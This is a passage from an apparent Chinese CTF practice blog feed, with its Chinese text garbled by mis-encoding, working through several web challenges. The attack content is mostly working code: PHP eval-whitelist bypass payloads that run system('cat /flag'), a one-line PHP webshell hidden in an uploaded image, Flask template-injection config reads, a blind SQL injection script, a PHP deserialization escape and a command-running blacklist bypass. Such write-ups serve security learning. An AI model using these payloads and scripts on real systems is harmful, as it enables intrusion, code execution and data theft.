class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload1:</p>
<p><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat%20/flag</code></p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt; <span class="string">"hex2bin"</span></span><br><span class="line">dechex(<span class="number">1598506324</span>) =&gt; <span class="string">"5f474554"</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$pi</span>=hex2bin("5f474554") =&gt; $pi="_GET"   //hex2binå°†ä¸€ä¸²16è¿›åˆ¶æ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</span></span><br><span class="line">(<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>)&#123;<span class="built-in">pi</span>&#125;((<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>)&#123;<span class="built-in">abs</span>&#125;) =&gt; (<span class="symbol">$</span>_GET)&#123;<span class="built-in">pi</span>&#125;(<span class="symbol">$</span>_GET)&#123;<span class="built-in">abs</span>&#125;  <span class="comment">//&#123;&#125;å¯ä»¥ä»£æ›¿[]</span></span><br></pre></td></tr></table></figure>

<p>payload2:</p>
<p><code>$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})</code></p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">base_convert(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt; <span class="string">"exec"</span></span><br><span class="line">$pi(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>) =&gt; <span class="string">"getallheaders"</span></span><br><span class="line">exec(getallheaders()&#123;<span class="number">1</span>&#125;)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200812222109098.png" alt="image-20200812222109098"></p>
<p>payload3:</p>
<p>é€šè¿‡ç™½åå•å’Œæ•°å­—å¼‚æˆ–å‡º <code>_GETæˆ–_POST</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$list = [<span class="string">'_G'</span>,<span class="string">'ET'</span>];</span><br><span class="line"></span><br><span class="line">$payload = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>,  <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span> , <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line"><span class="keyword">for</span>($t=<span class="number">0</span>;$t&lt;sizeof($list);$t++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>($k=<span class="number">0</span>;$k&lt;sizeof($payload);$k++)&#123;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; <span class="number">9</span>; $i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>($j = <span class="number">0</span>;$j &lt;=<span class="number">9</span>;$j++)&#123;</span><br><span class="line"></span><br><span class="line">                $exp = $payload[$k] ^ $i.$j;</span><br><span class="line">                <span class="keyword">if</span>($exp == $list[$t])</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">echo</span>($payload[$k].<span class="string">"^$i$j"</span>.<span class="string">"==&gt;$exp"</span>);</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&amp;0=system&amp;1=cat%20/flag</code></p>
<h3 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h3><p><code>.hatcess</code></p>
<p><code>SetHandler application/x-httpd-php</code></p>
<p><code>å›¾ç‰‡é©¬</code></p>
<p><code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;a&#39;]);&lt;/script&gt;</code></p>
<p>Nginx å¯ä»¥åˆ©ç”¨ <code>.user.ini</code> è‡ªåŠ¨åŒ…å«æ–‡ä»¶</p>
<p><code>auto_prepend_file=xx.jpg</code></p>
<h3 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) </span><br><span class="line">        + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>ç¦ç”¨ <code>()</code> RCEæ— ç¼˜</p>
<p>å†…ç½®å‡½æ•°ï¼Œæ¯”å¦‚<code>url_for</code>å’Œ<code>get_flashed_messages</code>è¯»å–é…ç½®æ–‡ä»¶</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/shrine/</span>&#123;&#123;url_for.__globals__[<span class="string">'current_app'</span>].config&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>æŠŠå­—ç¬¦ä¸²å¯¹è±¡è¡¨ç¤ºçš„æ¶ˆæ¯åŠ å…¥åˆ°ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œç„¶åé€šè¿‡è°ƒç”¨ get_flashed_messages() æ–¹æ³•å–å‡º(é—ªç°ä¿¡æ¯åªèƒ½å–å‡ºä¸€æ¬¡ï¼Œå–å‡ºåé—ªç°ä¿¡æ¯ä¼šè¢«æ¸…ç©º)</span><br><span class="line"><span class="regexp">/shrine/</span>&#123;&#123;get_flashed_messages.__globals__[<span class="string">'current_app'</span>].config&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h3><p>åˆæ˜¯ä¸€é“SSTI</p>
<p>æŠ“åŒ…å‘ç° userå­˜åœ¨SSTIæ³¨å…¥ï¼Œå‚è€ƒ<a href="[https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#1-PHP-%E5%AE%9E%E4%BE%8B](https://www.k0rz3n.com/2018/11/12/ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹SSTIæ¼æ´/#1-PHP-å®ä¾‹)">k0rz3nå¸ˆå‚…çš„æ–‡ç« </a></p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200813101645436.png" alt="image-20200813101645436"></p>
<h3 id="BJDCTF-2nd-ç®€å•æ³¨å…¥"><a href="#BJDCTF-2nd-ç®€å•æ³¨å…¥" class="headerlink" title="[BJDCTF 2nd]ç®€å•æ³¨å…¥"></a>[BJDCTF 2nd]ç®€å•æ³¨å…¥</h3><p>æ‰«ä¸€ä¸‹ç›®å½•ï¼Œå‘ç°äº†robots.txt,ç›´æ¥è®¿é—®hint.txt</p>
<p>å¾—åˆ° <code>select * from users where username=&#39;$_POST[&quot;username&quot;]&#39; and password=&#39;$_POST[&quot;password&quot;]&#39;;</code></p>
<p>ç¦ç”¨äº†ä¸€ä¸‹å…³é”®å­—</p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200813210653330.png" alt="image-20200813210653330"></p>
<p>è¿™é‡Œ <code>username</code>ä¼ å…¥ <code>\</code> å°±ä¼šæŠŠ <code>&#39;</code>è½¬ä¹‰ç ´åè¯­å¥ç»“æ„</p>
<p><code>username=\&amp;password=or/**/1&gt;0#</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'\'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'     or/**/1&gt;0#'</span></span><br></pre></td></tr></table></figure>

<p><code>1&gt;0 è¿”å›  BJD needs to be stronger</code></p>
<p><code>1&lt;0 è¿”å›  You konw ,P3rh4ps needs a girl friend</code></p>
<p>ç„¶åå†™ç›²æ³¨è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://70c88c86-504f-479c-be1d-0324c8bcbb17.node3.buuoj.cn/index.php"</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"username"</span>:<span class="string">"\\"</span>,<span class="string">"password"</span>:<span class="string">""</span>&#125;</span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span>(head &lt; tail):</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment">#print(mid)</span></span><br><span class="line">        payload = <span class="string">"or if(ascii(substr(username,&#123;&#125;,1))&gt;&#123;&#125;,1,0)#"</span>.format(i, mid)</span><br><span class="line">        payload = <span class="string">"or if(ascii(substr(password,&#123;&#125;,1))&gt;&#123;&#125;,1,0)#"</span>.format(i, mid)</span><br><span class="line">        data[<span class="string">'password'</span>] = payload</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"stronger"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    last = result</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<h3 id="2019-easy-serialize-php"><a href="#2019-easy-serialize-php" class="headerlink" title="[2019]easy_serialize_php"></a>[2019]easy_serialize_php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>extract($_POST);</code>å¯¼è‡´å˜é‡è¦†ç›–</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">"size"</span>=&gt;<span class="string">"2"</span>,<span class="string">"color"</span>=&gt;<span class="string">"blue"</span>);</span><br><span class="line">var_dump($a);</span><br><span class="line"></span><br><span class="line">extract(<span class="keyword">array</span>(<span class="string">"a"</span>=&gt;<span class="keyword">array</span>(<span class="string">"year"</span>,<span class="string">"2020"</span>)));</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥<code>$_SESSION</code>æ˜¯å¯æ§çš„ï¼Œé€šè¿‡<code>filter()</code>æ”¹å˜åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œä»è€Œå¯æ§<code>img</code>çš„å€¼</p>
<p>payload1:<code>å€¼é€ƒé€¸</code>ï¼Œè¿™å„¿éœ€è¦ä¸¤ä¸ªè¿ç»­çš„é”®å€¼å¯¹ï¼Œç”±ç¬¬ä¸€ä¸ªçš„å€¼è¦†ç›–ç¬¬äºŒä¸ªçš„é”®ï¼Œè¿™æ ·ç¬¬äºŒä¸ªå€¼å°±é€ƒé€¸å‡ºå»ï¼Œå•ç‹¬ä½œä¸ºä¸€ä¸ªé”®å€¼å¯¹</p>
<p>payload2:<code>é”®é€ƒé€¸</code>ï¼Œè¿™å„¿åªéœ€è¦ä¸€ä¸ªé”®å€¼å¯¹å°±è¡Œäº†ï¼Œæˆ‘ä»¬ç›´æ¥æ„é€ ä¼šè¢«è¿‡æ»¤çš„é”®ï¼Œè¿™æ ·å€¼å¾—ä¸€éƒ¨åˆ†å……å½“é”®ï¼Œå‰©ä¸‹å¾—ä¸€éƒ¨åˆ†ä½œä¸ºå•ç‹¬å¾—é”®å€¼å¯¹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = <span class="string">"show_image"</span> ;</span><br><span class="line"><span class="comment">//payload1</span></span><br><span class="line">$b=<span class="keyword">array</span>(<span class="string">"_SESSION"</span>=&gt;<span class="keyword">array</span>(<span class="string">"user"</span>=&gt;<span class="string">"flagflagflagflagflagflag"</span>,<span class="string">"function"</span>=&gt;<span class="string">'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";&#125;'</span>));</span><br><span class="line"><span class="comment">//payload2</span></span><br><span class="line"><span class="comment">//$b=array("_SESSION"=&gt;array("flagphp"=&gt;';s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;'));</span></span><br><span class="line">extract($b);</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line"></span><br><span class="line">var_dump(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line">var_dump($serialize_info);</span><br><span class="line"></span><br><span class="line">$userinfo = unserialize($serialize_info);</span><br><span class="line">var_dump($userinfo);</span><br></pre></td></tr></table></figure>

<p>æ¥ç€è¯»flagå°±è¡Œ</p>
<h3 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h3><p>æŠ“åŒ…åï¼Œè¯»æºç </p>
<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200815235733909.png" alt="image-20200815235733909"></p>
<p>è¿‡æ»¤å¾ˆå¤šï¼Œä½†æœ‰ä¸ªååºåˆ—åŒ–å‡½æ•°æ²¡è¢«ç¦ç”¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span><span class="params">($func, $p)</span> </span>&#123;</span><br><span class="line">    $result = call_user_func($func, $p);</span><br><span class="line">    $a= gettype($result);</span><br><span class="line">    <span class="keyword">if</span> ($a == <span class="string">"string"</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">""</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $p = <span class="string">"ls"</span>;</span><br><span class="line">    <span class="keyword">var</span> $func = <span class="string">"system"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">""</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/8æœˆåˆ·é¢˜è®°å½•/image-20200816000143586.png" alt="image-20200816000143586"></p>
<p>å‘½åç©ºé—´ç»•è¿‡é»‘åå•</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">func=\system&amp;p=cat <span class="constructor">$(<span class="params">find</span> <span class="operator">/</span> -<span class="params">name</span> <span class="params">flag</span><span class="operator">*</span>)</span></span><br></pre></td></tr></table></figure>

<h3 id="å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢"><a href="#å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢" class="headerlink" title="[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢"></a>[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</h3><p>å†™è„šæœ¬çˆ†ç ´GETå’ŒPOSTå‚æ•°</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import os</span><br><span class="line">import urllib</span><br><span class="line">import Queue</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'echo "hello_qwb_qwb";'</span></span><br><span class="line">url = <span class="string">'http://127.0.0.1/src/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fuzz(filename):</span><br><span class="line">    file = open(<span class="string">"./src/"</span> + filename, <span class="string">"r"</span>)</span><br><span class="line">    # <span class="builtin-name">print</span> <span class="string">"[*]open:"</span> + filename</span><br><span class="line">    text = file.read()</span><br><span class="line"></span><br><span class="line">    getpattern = re.compile(r<span class="string">'\$_GET\[\'</span>(.*)\<span class="string">'\]'</span>)</span><br><span class="line">    <span class="builtin-name">get</span> = getpattern.findall(text)</span><br><span class="line"></span><br><span class="line">    postpattern = re.compile(r<span class="string">'\$_POST\[\'</span>(.*)\<span class="string">'\]'</span>)</span><br><span class="line">    post = postpattern.findall(text)</span><br><span class="line"></span><br><span class="line">    file_url = url + filename</span><br><span class="line">    <span class="keyword">for</span> g <span class="keyword">in</span> get:</span><br><span class="line">        r = requests.<span class="builtin-name">get</span>(file_url + <span class="string">"?"</span> + g + <span class="string">"="</span> + urllib.quote(payload))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"hello_qwb_qwb"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="builtin-name">print</span>(<span class="string">"[+]file:"</span> + filename)</span><br><span class="line">            <span class="builtin-name">print</span>(<span class="string">"[+]get:"</span> + g)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> post:</span><br><span class="line">        data = &#123;p: payload&#125;</span><br><span class="line">        r = requests.post(file_url, <span class="attribute">data</span>=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"hello_qwb_qwb"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="builtin-name">print</span>(<span class="string">"[+]flie:"</span> + filename)</span><br><span class="line">            <span class="builtin-name">print</span>(<span class="string">"[+]post:"</span> + p)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">"[*]finish:"</span> + filename)</span><br><span class="line">    file.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class TextThread(threading.Thread):</span><br><span class="line">    def __init__(self, queue):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.__queue = queue</span><br><span class="line"></span><br><span class="line">    def <span class="builtin-name">run</span>(self):</span><br><span class="line">        global text</span><br><span class="line">       <span class="built_in"> queue </span>= self.__queue</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> queue.empty():</span><br><span class="line">            filename = queue.<span class="builtin-name">get</span>()</span><br><span class="line">            fuzz(filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">   <span class="built_in"> queue </span>= Queue.Queue()</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(<span class="string">'./src'</span>):</span><br><span class="line">        queue.put(filename)</span><br><span class="line"></span><br><span class="line">    thread_count = 8</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(0, thread_count):</span><br><span class="line">        thread = TextThread(queue)</span><br><span class="line">        thread.start()</span><br><span class="line">        threads.append(thread)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>åˆ·é¢˜</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF_7æœˆèµ›</title>
    <url>/2020/07/DASCTF-7%E6%9C%88%E8%B5%9B/</url>
